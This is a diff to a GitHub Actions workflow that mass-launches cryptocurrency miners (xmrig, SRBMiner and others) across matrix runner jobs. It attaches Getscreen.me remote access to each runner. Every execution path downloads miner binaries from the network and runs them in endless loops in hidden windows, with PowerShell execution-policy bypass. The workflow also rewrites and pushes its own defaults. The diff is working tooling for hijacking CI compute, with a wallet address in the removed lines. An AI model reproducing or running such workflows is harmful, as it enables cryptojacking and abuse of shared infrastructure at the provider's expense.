@@ -7,27 +7,31 @@ on:
         description: 'Runner Host Environment'
         type: choice
         options: [self-hosted, github]
-        default: 'github' # marker-runner
+        default: 'self-hosted' # marker-runner
       github_windows_version:
         description: 'GitHub Windows Version (If GitHub Host Selected)'
         type: choice
         options: [windows-latest, windows-2022, windows-2019]
         default: 'windows-latest' # marker-winver
       execution_type:
-        description: 'Execution Environment'
+        description: 'Primary Execution Environment'
         type: choice
         options: [windows, docker, wsl]
-        default: 'docker' # marker-exec
+        default: 'windows' # marker-exec
+      enable_fallback:
+        description: 'Enable Fallback (If Primary Fails, try others)'
+        type: boolean
+        default: true # marker-fallback
       getscreen_email:
         description: 'Getscreen.me Email'
         type: string
         required: true
-        default: 'dramatic.skink.kvck@hidingpost.com' # marker-getscreen
+        default: 'your@email.com' # marker-getscreen
       concurrent_devices:
         description: 'Concurrent Devices Active at Once'
         type: choice
         options: ['1', '2', '3', '4', '5', '10', '15', '20', '30', '50', '100']
-        default: '5' # marker-concurrent
+        default: '10' # marker-concurrent
       total_devices:
         description: 'Total Devices to Process in Queue'
         type: number
@@ -56,7 +60,7 @@ on:
         description: 'Wallet Address'
         type: string
         required: true
-        default: 'RLYqcPSqDkF97FjnUJJ1HUzeQ3ciVNm8S5' # marker-wallet
+        default: 'WALLET_ADDRESS' # marker-wallet
       pool:
         description: 'Pool Base URL'
         type: string
@@ -92,36 +96,58 @@ jobs:
           ARRAY=$(seq -s ',' 1 $TOTAL | sed 's/.*/[&]/')
           echo "matrix_array=$ARRAY" >> $GITHUB_OUTPUT
 
-      - name: Update Default Inputs Dynamically by Name
+      - name: Update Default Inputs (Foolproof Python Method)
+        shell: python
         run: |
-          WORKFLOW_FILE=$(grep -rl "name: Dynamic Manager" .github/workflows/ | head -n 1)
-          
-          if [ -z "$WORKFLOW_FILE" ]; then
-            echo "Error: Could not find workflow file."
-            exit 1
-          fi
+          import re, os, sys
 
-          echo "Updating file: $WORKFLOW_FILE"
+          target_file = None
+          for root, dirs, files in os.walk(".github/workflows"):
+              for file in files:
+                  filepath = os.path.join(root, file)
+                  with open(filepath, 'r') as f:
+                      if "name: Dynamic Manager" in f.read():
+                          target_file = filepath
+                          break
 
-          # Using '|' delimiter instead of '/' to securely handle algorithms like 'rx/0'
-          sed -i -E "s|default: 'github' # marker-runner|g" "$WORKFLOW_FILE"
-          sed -i -E "s|default: 'windows-latest' # marker-winver|g" "$WORKFLOW_FILE"
-          sed -i -E "s|default: 'docker' # marker-exec|g" "$WORKFLOW_FILE"
-          sed -i -E "s|default: 'dramatic.skink.kvck@hidingpost.com' # marker-getscreen|g" "$WORKFLOW_FILE"
-          sed -i -E "s|default: '5' # marker-concurrent|g" "$WORKFLOW_FILE"
-          sed -i -E "s|default: [0-9]+ # marker-total|default: ${{ inputs.total_devices }} # marker-total|g" "$WORKFLOW_FILE"
-          sed -i -E "s|default: '60' # marker-timeout|g" "$WORKFLOW_FILE"
-          sed -i -E "s|default: 'cpuminer-rplant' # marker-miner|g" "$WORKFLOW_FILE"
-          sed -i -E "s|default: 'gr' # marker-algo|g" "$WORKFLOW_FILE"
-          sed -i -E "s|default: 'RTM' # marker-coin|g" "$WORKFLOW_FILE"
-          sed -i -E "s|default: 'RLYqcPSqDkF97FjnUJJ1HUzeQ3ciVNm8S5' # marker-wallet|g" "$WORKFLOW_FILE"
-          sed -i -E "s|default: 'rplant.xyz' # marker-pool|g" "$WORKFLOW_FILE"
-          sed -i -E "s|default: 'na' # marker-region|g" "$WORKFLOW_FILE"
-          sed -i -E "s|default: '17056' # marker-port|g" "$WORKFLOW_FILE"
+          if not target_file:
+              print("Workflow file not found!")
+              sys.exit(1)
 
+          with open(target_file, 'r') as f:
+              content = f.read()
+
+          # Map markers to new inputs securely
+          replacements = {
+              "marker-runner": f"'{'''${{ inputs.runner_type }}'''.strip()}'",
+              "marker-winver": f"'{'''${{ inputs.github_windows_version }}'''.strip()}'",
+              "marker-exec": f"'{'''${{ inputs.execution_type }}'''.strip()}'",
+              "marker-fallback": f"{'''${{ inputs.enable_fallback }}'''.strip().lower()}",
+              "marker-getscreen": f"'{'''${{ inputs.getscreen_email }}'''.strip()}'",
+              "marker-concurrent": f"'{'''${{ inputs.concurrent_devices }}'''.strip()}'",
+              "marker-total": f"{'''${{ inputs.total_devices }}'''.strip()}",
+              "marker-timeout": f"'{'''${{ inputs.timeout }}'''.strip()}'",
+              "marker-miner": f"'{'''${{ inputs.miner }}'''.strip()}'",
+              "marker-algo": f"'{'''${{ inputs.algo }}'''.strip()}'",
+              "marker-coin": f"'{'''${{ inputs.coin }}'''.strip()}'",
+              "marker-wallet": f"'{'''${{ inputs.wallet }}'''.strip()}'",
+              "marker-pool": f"'{'''${{ inputs.pool }}'''.strip()}'",
+              "marker-region": f"'{'''${{ inputs.region }}'''.strip()}'",
+              "marker-port": f"'{'''${{ inputs.port }}'''.strip()}'"
+          }
+
+          for marker, new_val in replacements.items():
+              pattern = r"(default:\s*).*?( # " + marker + r")"
+              content = re.sub(pattern, r"\g<1>" + new_val + r"\g<2>", content)
+
+          with open(target_file, 'w') as f:
+              f.write(content)
+
+      - name: Commit Saved Inputs
+        run: |
           git config user.name "github-actions[bot]"
           git config user.email "github-actions[bot]@users.noreply.github.com"
-          git add "$WORKFLOW_FILE"
+          git add .github/workflows/
           git commit -m "Auto-update miner inputs from latest run" || echo "No changes to commit"
           git push
 
@@ -148,24 +174,19 @@ jobs:
           $Wallet = "${{ inputs.wallet }}"
           $PoolDomain = "${{ inputs.pool }}"
           
-          # Shorten Wallet string (last 3 chars)
           $WalletSuffix = $Wallet.Substring([math]::Max(0, $Wallet.Length - 3))
           
-          # Short Miner Mapping
           $MinerShort = "rpl"
           if ($MinerInput -match "srb") { $MinerShort = "srb" }
           if ($MinerInput -match "xmr") { $MinerShort = "xmr" }
           if ($MinerInput -match "wild") { $MinerShort = "wld" }
 
-          # Short Algo Mapping (Clean slashes for safe filenames)
           $AlgoShort = $AlgoInput.Replace("/", "") 
           if ($AlgoShort.Length -gt 4) { $AlgoShort = $AlgoShort.Substring(0, 4) } 
 
-          # Short Pool Mapping
           $PoolShort = "pool"
           if ($PoolDomain -match "rplant") { $PoolShort = "rpl" }
 
-          # Format: 1-srb-gr-rtm-rpl-eu-123
           $DeviceName = "$Index-$MinerShort-$AlgoShort-$CoinInput-$PoolShort-$Region-$WalletSuffix"
           $PoolUrl = "$Region.$PoolDomain:${{ inputs.port }}"
           
@@ -184,115 +205,117 @@ jobs:
           .\getscreen.exe -name "$env:DEVICE_NAME"
           
           $global:LASTEXITCODE = 0
-          Write-Host "Getscreen successfully attached!"
 
-      - name: Dynamic Miner Setup & Execution
+      - name: Smart Execution & Fallback Manager
         shell: powershell
         run: |
           $ExecType = "${{ inputs.execution_type }}"
+          $Fallback = "${{ inputs.enable_fallback }}" -eq "true"
           $Miner = "${{ inputs.miner }}"
           $DockerName = "miner-$($env:DEVICE_NAME)".ToLower()
           
-          # 1. Variables for Windows Execution
-          $WinDownloadUrl = ""
-          $WinExeName = ""
-          $WinArgs = ""
+          # Generate Smart Queue based on Selection & Fallback setting
+          $TryQueue = @($ExecType)
+          if ($Fallback) {
+             if ($ExecType -eq 'docker') { $TryQueue = @('docker', 'wsl', 'windows') }
+             elseif ($ExecType -eq 'wsl') { $TryQueue = @('wsl', 'docker', 'windows') }
+             elseif ($ExecType -eq 'windows') { $TryQueue = @('windows', 'wsl', 'docker') }
+          }
           
-          # 2. Variables for Linux Execution (Docker/WSL)
-          $LinDownloadUrl = ""
-          $LinExtractCmd = "tar -xf miner.archive"
-          $LinRunCmd = ""
+          Write-Host "Execution Queue Scheduled: $($TryQueue -join ' -> ')"
+
+          # Set Miner specific variables
+          $WinUrl = ""; $WinExe = ""; $WinArgs = ""
+          $LinUrl = ""; $LinCmd = ""
 
           if ($Miner -eq "cpuminer-rplant") {
-            $WinDownloadUrl = "https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.36/cpuminer-opt-win.zip"
-            $WinExeName = "cpuminer-sse2.exe"
+            $WinUrl = "https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.36/cpuminer-opt-win.zip"
+            $WinExe = "cpuminer-sse2.exe"
             $WinArgs = "-a $($env:ALGO) -o stratum+tcps://$($env:POOL_URL) -u ${{ inputs.wallet }}.$($env:DEVICE_NAME)"
-            
-            $LinDownloadUrl = "https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.36/cpuminer-opt-linux.tar.gz"
-            $LinRunCmd = "./cpuminer-sse2 -a $($env:ALGO) -o stratum+tcps://$($env:POOL_URL) -u ${{ inputs.wallet }}.$($env:DEVICE_NAME)"
-          } 
-          elseif ($Miner -eq "srbminer-multi") {
-            $WinDownloadUrl = "https://github.com/doktor83/SRBMiner-Multi/releases/download/2.4.6/SRBMiner-Multi-2-4-6-Windows.zip"
-            $WinExeName = "SRBMiner-MULTI.exe"
+            $LinUrl = "https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.36/cpuminer-opt-linux.tar.gz"
+            $LinCmd = "./cpuminer-sse2 -a $($env:ALGO) -o stratum+tcps://$($env:POOL_URL) -u ${{ inputs.wallet }}.$($env:DEVICE_NAME)"
+          } elseif ($Miner -eq "srbminer-multi") {
+            $WinUrl = "https://github.com/doktor83/SRBMiner-Multi/releases/download/2.4.6/SRBMiner-Multi-2-4-6-Windows.zip"
+            $WinExe = "SRBMiner-MULTI.exe"
             $WinArgs = "--disable-gpu --algorithm $($env:ALGO) --pool $($env:POOL_URL) --wallet ${{ inputs.wallet }}.$($env:DEVICE_NAME)"
-            
-            $LinDownloadUrl = "https://github.com/doktor83/SRBMiner-Multi/releases/download/2.4.6/SRBMiner-Multi-2-4-6-Linux.tar.xz"
-            $LinRunCmd = "./SRBMiner-Multi-2-4-6/SRBMiner-MULTI --disable-gpu --algorithm $($env:ALGO) --pool $($env:POOL_URL) --wallet ${{ inputs.wallet }}.$($env:DEVICE_NAME)"
-          }
-          elseif ($Miner -eq "xmrig") {
-            $WinDownloadUrl = "https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-gcc-win64.zip"
-            $WinExeName = "xmrig.exe"
+            $LinUrl = "https://github.com/doktor83/SRBMiner-Multi/releases/download/2.4.6/SRBMiner-Multi-2-4-6-Linux.tar.xz"
+            $LinCmd = "./SRBMiner-Multi-2-4-6/SRBMiner-MULTI --disable-gpu --algorithm $($env:ALGO) --pool $($env:POOL_URL) --wallet ${{ inputs.wallet }}.$($env:DEVICE_NAME)"
+          } elseif ($Miner -eq "xmrig") {
+            $WinUrl = "https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-gcc-win64.zip"
+            $WinExe = "xmrig.exe"
             $WinArgs = "-a $($env:ALGO) -o $($env:POOL_URL) -u ${{ inputs.wallet }}.$($env:DEVICE_NAME)"
-            
-            $LinDownloadUrl = "https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-x64.tar.gz"
-            $LinRunCmd = "./xmrig-6.21.0/xmrig -a $($env:ALGO) -o $($env:POOL_URL) -u ${{ inputs.wallet }}.$($env:DEVICE_NAME)"
-          }
-          elseif ($Miner -eq "wildrig-multi") {
-            $WinDownloadUrl = "https://github.com/andru-kun/wildrig-multi/releases/download/0.40.8/wildrig-multi-windows-0.40.8.zip"
-            $WinExeName = "wildrig-multi.exe"
+            $LinUrl = "https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-x64.tar.gz"
+            $LinCmd = "./xmrig-6.21.0/xmrig -a $($env:ALGO) -o $($env:POOL_URL) -u ${{ inputs.wallet }}.$($env:DEVICE_NAME)"
+          } elseif ($Miner -eq "wildrig-multi") {
+            $WinUrl = "https://github.com/andru-kun/wildrig-multi/releases/download/0.40.8/wildrig-multi-windows-0.40.8.zip"
+            $WinExe = "wildrig-multi.exe"
             $WinArgs = "--algo $($env:ALGO) --url stratum+tcps://$($env:POOL_URL) --user ${{ inputs.wallet }}.$($env:DEVICE_NAME)"
-            
-            $LinDownloadUrl = "https://github.com/andru-kun/wildrig-multi/releases/download/0.40.8/wildrig-multi-linux-0.40.8.tar.xz"
-            $LinRunCmd = "./wildrig-multi --algo $($env:ALGO) --url stratum+tcps://$($env:POOL_URL) --user ${{ inputs.wallet }}.$($env:DEVICE_NAME)"
+            $LinUrl = "https://github.com/andru-kun/wildrig-multi/releases/download/0.40.8/wildrig-multi-linux-0.40.8.tar.xz"
+            $LinCmd = "./wildrig-multi --algo $($env:ALGO) --url stratum+tcps://$($env:POOL_URL) --user ${{ inputs.wallet }}.$($env:DEVICE_NAME)"
           }
 
-          $FallbackToWindows = $false
+          $Success = $false
 
-          if ($ExecType -eq 'docker') {
-             Write-Host "Building Docker Image for Linux Mining..."
-             
-             # Using Add-Content instead of multi-line strings prevents YAML parser crashes
-             Set-Content -Path "Dockerfile" -Value "FROM public.ecr.aws/lts/ubuntu:latest"
-             Add-Content -Path "Dockerfile" -Value "ENV DEBIAN_FRONTEND=noninteractive"
-             Add-Content -Path "Dockerfile" -Value "RUN apt-get update && apt-get -y install wget tar ca-certificates xz-utils"
-             Add-Content -Path "Dockerfile" -Value "WORKDIR /miner"
-             Add-Content -Path "Dockerfile" -Value "RUN wget -qO miner.archive $LinDownloadUrl && $LinExtractCmd"
-             Add-Content -Path "Dockerfile" -Value "CMD [ `"sh`", `"-c`", `"$LinRunCmd`" ]"
-             
-             # Wrap in Start-Process to safely catch errors if Windows Container Mode is active
-             $DockerBuild = Start-Process docker -ArgumentList "build -t $DockerName ." -NoNewWindow -Wait -PassThru
-             
-             if ($DockerBuild.ExitCode -eq 0) {
-                Write-Host "Docker build successful! Launching container..."
-                docker run -d --name $DockerName $DockerName
-             } else {
-                Write-Host "WARNING: Docker Build Failed! (Likely due to Windows Container mode)"
-                Write-Host "FALLBACK ENABLED: Switching to Windows Native Execution automatically..."
-                $FallbackToWindows = $true
+          foreach ($Method in $TryQueue) {
+             if ($Method -eq 'docker') {
+                Write-Host "`n--- Attempting DOCKER Execution ---"
+                try {
+                   Set-Content -Path "Dockerfile" -Value "FROM public.ecr.aws/lts/ubuntu:latest"
+                   Add-Content -Path "Dockerfile" -Value "ENV DEBIAN_FRONTEND=noninteractive"
+                   Add-Content -Path "Dockerfile" -Value "RUN apt-get update && apt-get -y install wget tar ca-certificates xz-utils"
+                   Add-Content -Path "Dockerfile" -Value "WORKDIR /miner"
+                   Add-Content -Path "Dockerfile" -Value "RUN wget -qO archive $LinUrl && tar -xf archive"
+                   Add-Content -Path "Dockerfile" -Value "CMD [ `"sh`", `"-c`", `"$LinCmd`" ]"
+                   
+                   docker build -t $DockerName . 
+                   if ($LASTEXITCODE -eq 0) {
+                      docker run -d --name $DockerName $DockerName
+                      if ($LASTEXITCODE -eq 0) {
+                         $Success = $true; Write-Host "✅ Docker successfully started!"; break
+                      }
+                   }
+                   Write-Host "❌ Docker build or run failed."
+                } catch { Write-Host "❌ Docker encountered an exception." }
+             }
+
+             elseif ($Method -eq 'wsl') {
+                Write-Host "`n--- Attempting WSL Execution ---"
+                try {
+                   $WslCheck = wsl bash -c "echo OK" 2>$null
+                   if ($WslCheck -match "OK") {
+                      wsl bash -c "mkdir -p /tmp/miner && cd /tmp/miner && wget -qO archive $LinUrl && tar -xf archive"
+                      wsl bash -c "echo '#!/bin/bash' > /tmp/miner/run.sh && echo 'cd /tmp/miner' >> /tmp/miner/run.sh && echo 'while true; do $LinCmd; sleep 5; done' >> /tmp/miner/run.sh && chmod +x /tmp/miner/run.sh"
+                      Start-Process wsl -ArgumentList "-e bash /tmp/miner/run.sh" -WindowStyle Hidden
+                      $Success = $true; Write-Host "✅ WSL successfully started!"; break
+                   } else {
+                      Write-Host "❌ WSL is not installed or not functional."
+                   }
+                } catch { Write-Host "❌ WSL encountered an exception." }
+             }
+
+             elseif ($Method -eq 'windows') {
+                Write-Host "`n--- Attempting WINDOWS NATIVE Execution ---"
+                try {
+                   New-Item -ItemType Directory -Force -Path .\windows_miner | Out-Null
+                   Invoke-WebRequest $WinUrl -OutFile "miner.zip" -UseBasicParsing
+                   Expand-Archive miner.zip -DestinationPath .\windows_miner -Force
+                   
+                   $FoundExe = Get-ChildItem -Path .\windows_miner -Filter $WinExe -Recurse | Select-Object -First 1
+                   if ($FoundExe) {
+                      $Script = "while (1) { & `"$($FoundExe.FullName)`" $WinArgs; Start-Sleep -Seconds 5 }"
+                      Set-Content -Path "mine.ps1" -Value $Script
+                      Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -File mine.ps1" -WindowStyle Hidden
+                      $Success = $true; Write-Host "✅ Windows Native successfully started!"; break
+                   } else {
+                      Write-Host "❌ Could not find expected executable in downloaded zip."
+                   }
+                } catch { Write-Host "❌ Windows setup encountered an exception." }
              }
           }
 
-          if ($ExecType -eq 'wsl') {
-             Write-Host "Setting up Linux Miner inside WSL native environment..."
-             wsl bash -c "mkdir -p /tmp/miner && cd /tmp/miner && wget -qO miner.archive $LinDownloadUrl && $LinExtractCmd"
-             
-             wsl bash -c "echo '#!/bin/bash' > /tmp/miner/run.sh"
-             wsl bash -c "echo 'cd /tmp/miner' >> /tmp/miner/run.sh"
-             wsl bash -c "echo 'while true; do $LinRunCmd; sleep 5; done' >> /tmp/miner/run.sh"
-             wsl bash -c "chmod +x /tmp/miner/run.sh"
-             
-             Write-Host "Launching WSL Miner Process..."
-             Start-Process wsl -ArgumentList "-e bash /tmp/miner/run.sh" -WindowStyle Hidden
-          }
-
-          if ($ExecType -eq 'windows' -or $FallbackToWindows -eq $true) {
-             Write-Host "Setting up Native Windows Miner..."
-             New-Item -ItemType Directory -Force -Path .\windows_miner | Out-Null
-             
-             Invoke-WebRequest $WinDownloadUrl -OutFile "miner.zip" -UseBasicParsing
-             Expand-Archive miner.zip -DestinationPath .\windows_miner -Force
-             
-             $FoundExe = Get-ChildItem -Path .\windows_miner -Filter $WinExeName -Recurse | Select-Object -First 1
-             
-             if ($FoundExe) {
-                Write-Host "Launching Windows Miner: $($FoundExe.FullName) with args: $WinArgs"
-                $Script = "while (1) { & `"$($FoundExe.FullName)`" $WinArgs; Start-Sleep -Seconds 5 }"
-                Set-Content -Path "mine.ps1" -Value $Script
-                Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -File mine.ps1" -WindowStyle Hidden
-             } else {
-                Write-Host "Error: Could not extract/find Windows miner executable."
-                exit 1
-             }
+          if (-not $Success) {
+             Write-Host "`n🛑 FATAL: All execution methods failed. Terminating job."
+             exit 1
           }
 
       - name: Runtime Timer & Job Completion
@@ -302,17 +325,14 @@ jobs:
           Write-Host "Mining active. Task is sleeping for $TimeoutMins minutes to keep job alive..."
           Start-Sleep -Seconds ($TimeoutMins * 60)
 
-          Write-Host "Timeout reached. Attempting graceful universal cleanup..."
+          Write-Host "Timeout reached. Attempting universal cleanup..."
           
-          # Clean up Windows processes
           Stop-Process -Name "cpuminer-sse2", "SRBMiner-MULTI", "xmrig", "wildrig-multi", "powershell" -Force -ErrorAction SilentlyContinue
           
-          # Clean up Docker (if it exists)
           $DockerName = "miner-$($env:DEVICE_NAME)".ToLower()
           docker stop $DockerName -t 0 2>$null
           docker rm $DockerName 2>$null
           
-          # Clean up WSL (if it exists)
           wsl bash -c "pkill -f miner" 2>$null
           
           Write-Host "Closing runner task so matrix can queue the next iteration..."
